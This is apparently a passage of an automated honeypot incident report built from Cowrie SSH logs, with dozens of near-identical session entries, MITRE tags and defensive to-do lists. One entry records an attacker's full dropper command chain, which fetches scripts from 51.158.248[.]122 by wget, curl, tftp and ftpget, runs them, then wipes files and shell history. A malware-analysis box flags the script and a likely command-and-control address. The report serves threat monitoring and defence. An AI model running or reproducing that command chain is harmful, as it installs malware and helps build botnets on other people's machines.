|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:09 |
| **Last Seen** | 2026-06-25 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:09:44` | `cowrie.session.connect` |
| `2026-06-25 07:09:44` | `cowrie.client.version` |
| `2026-06-25 07:09:44` | `cowrie.client.kex` |
| `2026-06-25 07:09:45` | `cowrie.login.success` |
| `2026-06-25 07:09:46` | `cowrie.session.params` |
| `2026-06-25 07:09:46` | `cowrie.command.input` |
| `2026-06-25 07:09:46` | `cowrie.log.closed` |
| `2026-06-25 07:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cbec4275912

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:09 |
| **Last Seen** | 2026-06-25 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:09:49` | `cowrie.session.connect` |
| `2026-06-25 07:09:49` | `cowrie.client.version` |
| `2026-06-25 07:09:49` | `cowrie.client.kex` |
| `2026-06-25 07:09:49` | `cowrie.login.success` |
| `2026-06-25 07:09:50` | `cowrie.session.params` |
| `2026-06-25 07:09:50` | `cowrie.command.input` |
| `2026-06-25 07:09:50` | `cowrie.log.closed` |
| `2026-06-25 07:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540c06656d5d

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:09 |
| **Last Seen** | 2026-06-25 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:09:50` | `cowrie.session.connect` |
| `2026-06-25 07:09:50` | `cowrie.client.version` |
| `2026-06-25 07:09:50` | `cowrie.client.kex` |
| `2026-06-25 07:09:51` | `cowrie.login.success` |
| `2026-06-25 07:09:52` | `cowrie.session.params` |
| `2026-06-25 07:09:52` | `cowrie.command.input` |
| `2026-06-25 07:09:52` | `cowrie.log.closed` |
| `2026-06-25 07:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5be90a4dbc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:10 |
| **Last Seen** | 2026-06-25 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:10:43` | `cowrie.session.connect` |
| `2026-06-25 07:10:43` | `cowrie.client.version` |
| `2026-06-25 07:10:43` | `cowrie.client.kex` |
| `2026-06-25 07:10:43` | `cowrie.login.success` |
| `2026-06-25 07:10:44` | `cowrie.session.params` |
| `2026-06-25 07:10:44` | `cowrie.command.input` |
| `2026-06-25 07:10:44` | `cowrie.log.closed` |
| `2026-06-25 07:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389576f30805

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:10 |
| **Last Seen** | 2026-06-25 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:10:54` | `cowrie.session.connect` |
| `2026-06-25 07:10:54` | `cowrie.client.version` |
| `2026-06-25 07:10:54` | `cowrie.client.kex` |
| `2026-06-25 07:10:55` | `cowrie.login.success` |
| `2026-06-25 07:10:56` | `cowrie.session.params` |
| `2026-06-25 07:10:56` | `cowrie.command.input` |
| `2026-06-25 07:10:56` | `cowrie.log.closed` |
| `2026-06-25 07:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bda98b2016

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:11 |
| **Last Seen** | 2026-06-25 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:11:36` | `cowrie.session.connect` |
| `2026-06-25 07:11:36` | `cowrie.client.version` |
| `2026-06-25 07:11:36` | `cowrie.client.kex` |
| `2026-06-25 07:11:36` | `cowrie.login.success` |
| `2026-06-25 07:11:37` | `cowrie.session.params` |
| `2026-06-25 07:11:37` | `cowrie.command.input` |
| `2026-06-25 07:11:37` | `cowrie.log.closed` |
| `2026-06-25 07:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbaf5ecf1c6f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:11 |
| **Last Seen** | 2026-06-25 07:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:11:50` | `cowrie.session.connect` |
| `2026-06-25 07:11:50` | `cowrie.client.version` |
| `2026-06-25 07:11:50` | `cowrie.client.kex` |
| `2026-06-25 07:11:51` | `cowrie.login.success` |
| `2026-06-25 07:11:52` | `cowrie.session.params` |
| `2026-06-25 07:11:52` | `cowrie.command.input` |
| `2026-06-25 07:11:52` | `cowrie.log.closed` |
| `2026-06-25 07:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-badd5df9d7f9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:12 |
| **Last Seen** | 2026-06-25 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:12:30` | `cowrie.session.connect` |
| `2026-06-25 07:12:30` | `cowrie.client.version` |
| `2026-06-25 07:12:30` | `cowrie.client.kex` |
| `2026-06-25 07:12:31` | `cowrie.login.success` |
| `2026-06-25 07:12:31` | `cowrie.session.params` |
| `2026-06-25 07:12:31` | `cowrie.command.input` |
| `2026-06-25 07:12:31` | `cowrie.log.closed` |
| `2026-06-25 07:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c78909ea217

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:12 |
| **Last Seen** | 2026-06-25 07:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:12:53` | `cowrie.session.connect` |
| `2026-06-25 07:12:53` | `cowrie.client.version` |
| `2026-06-25 07:12:53` | `cowrie.client.kex` |
| `2026-06-25 07:12:54` | `cowrie.login.success` |
| `2026-06-25 07:12:55` | `cowrie.session.params` |
| `2026-06-25 07:12:55` | `cowrie.command.input` |
| `2026-06-25 07:12:55` | `cowrie.log.closed` |
| `2026-06-25 07:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e3ef7ed2cff

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:13 |
| **Last Seen** | 2026-06-25 07:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:13:03` | `cowrie.session.connect` |
| `2026-06-25 07:13:03` | `cowrie.client.version` |
| `2026-06-25 07:13:03` | `cowrie.client.kex` |
| `2026-06-25 07:13:04` | `cowrie.login.success` |
| `2026-06-25 07:13:05` | `cowrie.session.params` |
| `2026-06-25 07:13:05` | `cowrie.command.input` |
| `2026-06-25 07:13:05` | `cowrie.log.closed` |
| `2026-06-25 07:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f  (Bash Script)
   SHA256: 725d1de20672ed85f32e823fe067ed6eb17149019e146baf...
   Score : 84/100  |  VT: 36/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ chmod +x (make executable): chmod +x
   ↳ IP:Port (possible C2): 51.158.248[.]122:8517
```

### 🔴 HIGH · IR-d284a9f0f6c4

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 07:13 |
| **Last Seen** | 2026-06-25 07:13 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp; wget hxxp://51.158.248[.]122:8517/bins.sh; curl -O hxxp://51.158.248[.]122:8517/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.158.248[.]122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.158.248[.]122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.158.248[.]122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/armv6l |
| **Malware Analysis** | 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f (HIGH), 4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02 (MEDIUM), 494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984 (MEDIUM), 6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c (MEDIUM), 80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:13:04` | `cowrie.session.connect` |
| `2026-06-25 07:13:05` | `cowrie.login.success` |
| `2026-06-25 07:13:05` | `cowrie.session.params` |
| `2026-06-25 07:13:07` | `cowrie.command.input` |
| `2026-06-25 07:13:07` | `cowrie.command.input` |
| `2026-06-25 07:13:07` | `cowrie.session.file_download` |
| `2026-06-25 07:13:07` | `cowrie.session.file_download` |
| `2026-06-25 07:13:07` | `cowrie.session.file_download` |
| `2026-06-25 07:13:07` | `cowrie.session.file_download.failed` |
| `2026-06-25 07:13:07` | `cowrie.session.file_download` |
| `2026-06-25 07:13:08` | `cowrie.session.file_download` |
| `2026-06-25 07:13:08` | `cowrie.session.file_download` |
| `2026-06-25 07:13:08` | `cowrie.session.file_download` |
| `2026-06-25 07:13:08` | `cowrie.session.file_download` |
| `2026-06-25 07:13:08` | `cowrie.session.file_download` |
| `2026-06-25 07:13:09` | `cowrie.session.file_download` |
| `2026-06-25 07:13:22` | `cowrie.log.closed` |
| `2026-06-25 07:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52107e846675

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:13 |
| **Last Seen** | 2026-06-25 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:13:26` | `cowrie.session.connect` |
| `2026-06-25 07:13:26` | `cowrie.client.version` |
| `2026-06-25 07:13:26` | `cowrie.client.kex` |
| `2026-06-25 07:13:27` | `cowrie.login.success` |
| `2026-06-25 07:13:28` | `cowrie.session.params` |
| `2026-06-25 07:13:28` | `cowrie.command.input` |
| `2026-06-25 07:13:28` | `cowrie.log.closed` |
| `2026-06-25 07:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c15d04c15ff

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:14 |
| **Last Seen** | 2026-06-25 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:14:23` | `cowrie.session.connect` |
| `2026-06-25 07:14:23` | `cowrie.client.version` |
| `2026-06-25 07:14:23` | `cowrie.client.kex` |
| `2026-06-25 07:14:24` | `cowrie.login.success` |
| `2026-06-25 07:14:24` | `cowrie.session.params` |
| `2026-06-25 07:14:24` | `cowrie.command.input` |
| `2026-06-25 07:14:24` | `cowrie.log.closed` |
| `2026-06-25 07:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-526ae5c113c1

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:14 |
| **Last Seen** | 2026-06-25 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:14:53` | `cowrie.session.connect` |
| `2026-06-25 07:14:53` | `cowrie.client.version` |
| `2026-06-25 07:14:53` | `cowrie.client.kex` |
| `2026-06-25 07:14:54` | `cowrie.login.success` |
| `2026-06-25 07:14:55` | `cowrie.session.params` |
| `2026-06-25 07:14:55` | `cowrie.command.input` |
| `2026-06-25 07:14:55` | `cowrie.log.closed` |
| `2026-06-25 07:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d40d16a2a523

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:15 |
| **Last Seen** | 2026-06-25 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:15:19` | `cowrie.session.connect` |
| `2026-06-25 07:15:19` | `cowrie.client.version` |
| `2026-06-25 07:15:19` | `cowrie.client.kex` |
| `2026-06-25 07:15:20` | `cowrie.login.success` |
| `2026-06-25 07:15:21` | `cowrie.session.params` |
| `2026-06-25 07:15:21` | `cowrie.command.input` |
| `2026-06-25 07:15:21` | `cowrie.log.closed` |
| `2026-06-25 07:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8735b58a22d1

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:15 |
| **Last Seen** | 2026-06-25 07:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:15:51` | `cowrie.session.connect` |
| `2026-06-25 07:15:51` | `cowrie.client.version` |
| `2026-06-25 07:15:52` | `cowrie.client.kex` |
| `2026-06-25 07:15:52` | `cowrie.login.success` |
| `2026-06-25 07:15:53` | `cowrie.session.params` |
| `2026-06-25 07:15:53` | `cowrie.command.input` |
| `2026-06-25 07:15:53` | `cowrie.log.closed` |
| `2026-06-25 07:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61686a206102

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:16 |
| **Last Seen** | 2026-06-25 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:16:14` | `cowrie.session.connect` |
| `2026-06-25 07:16:14` | `cowrie.client.version` |
| `2026-06-25 07:16:15` | `cowrie.client.kex` |
| `2026-06-25 07:16:15` | `cowrie.login.success` |
| `2026-06-25 07:16:16` | `cowrie.session.params` |
| `2026-06-25 07:16:16` | `cowrie.command.input` |
| `2026-06-25 07:16:16` | `cowrie.log.closed` |
| `2026-06-25 07:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de542c354f21

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:17 |
| **Last Seen** | 2026-06-25 07:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:17:01` | `cowrie.session.connect` |
| `2026-06-25 07:17:01` | `cowrie.client.version` |
| `2026-06-25 07:17:01` | `cowrie.client.kex` |
| `2026-06-25 07:17:02` | `cowrie.login.success` |
| `2026-06-25 07:17:03` | `cowrie.session.params` |
| `2026-06-25 07:17:03` | `cowrie.command.input` |
| `2026-06-25 07:17:04` | `cowrie.log.closed` |
| `2026-06-25 07:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc2529b14cd

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:17 |
| **Last Seen** | 2026-06-25 07:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:17:04` | `cowrie.session.connect` |
| `2026-06-25 07:17:04` | `cowrie.client.version` |
| `2026-06-25 07:17:05` | `cowrie.client.kex` |
| `2026-06-25 07:17:05` | `cowrie.login.success` |
| `2026-06-25 07:17:06` | `cowrie.session.params` |
| `2026-06-25 07:17:06` | `cowrie.command.input` |
| `2026-06-25 07:17:06` | `cowrie.log.closed` |
| `2026-06-25 07:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f62a0fcb6d3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:17 |
| **Last Seen** | 2026-06-25 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:17:09` | `cowrie.session.connect` |
| `2026-06-25 07:17:09` | `cowrie.client.version` |
| `2026-06-25 07:17:10` | `cowrie.client.kex` |
| `2026-06-25 07:17:10` | `cowrie.login.success` |
| `2026-06-25 07:17:11` | `cowrie.session.params` |
| `2026-06-25 07:17:11` | `cowrie.command.input` |
| `2026-06-25 07:17:11` | `cowrie.log.closed` |
| `2026-06-25 07:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d148171d8f7b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 07:17 |
| **Last Seen** | 2026-06-25 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:17:29` | `cowrie.session.connect` |
| `2026-06-25 07:17:29` | `cowrie.client.version` |
| `2026-06-25 07:17:29` | `cowrie.client.kex` |
| `2026-06-25 07:17:29` | `cowrie.login.success` |
| `2026-06-25 07:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684266f731c8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 07:17 |
| **Last Seen** | 2026-06-25 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:17:29` | `cowrie.session.connect` |
| `2026-06-25 07:17:29` | `cowrie.client.version` |
| `2026-06-25 07:17:29` | `cowrie.client.kex` |
| `2026-06-25 07:17:30` | `cowrie.login.success` |
| `2026-06-25 07:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c21a6a5a4e2

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:17 |
| **Last Seen** | 2026-06-25 07:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:17:45` | `cowrie.session.connect` |
| `2026-06-25 07:17:45` | `cowrie.client.version` |
| `2026-06-25 07:17:45` | `cowrie.client.kex` |
| `2026-06-25 07:17:46` | `cowrie.login.success` |
| `2026-06-25 07:17:47` | `cowrie.session.params` |
| `2026-06-25 07:17:47` | `cowrie.command.input` |
| `2026-06-25 07:17:47` | `cowrie.log.closed` |
| `2026-06-25 07:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eece01828aec

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:18 |
| **Last Seen** | 2026-06-25 07:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:18:01` | `cowrie.session.connect` |
| `2026-06-25 07:18:01` | `cowrie.client.version` |
| `2026-06-25 07:18:01` | `cowrie.client.kex` |
| `2026-06-25 07:18:02` | `cowrie.login.success` |
| `2026-06-25 07:18:03` | `cowrie.session.params` |
| `2026-06-25 07:18:03` | `cowrie.command.input` |
| `2026-06-25 07:18:03` | `cowrie.log.closed` |
| `2026-06-25 07:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

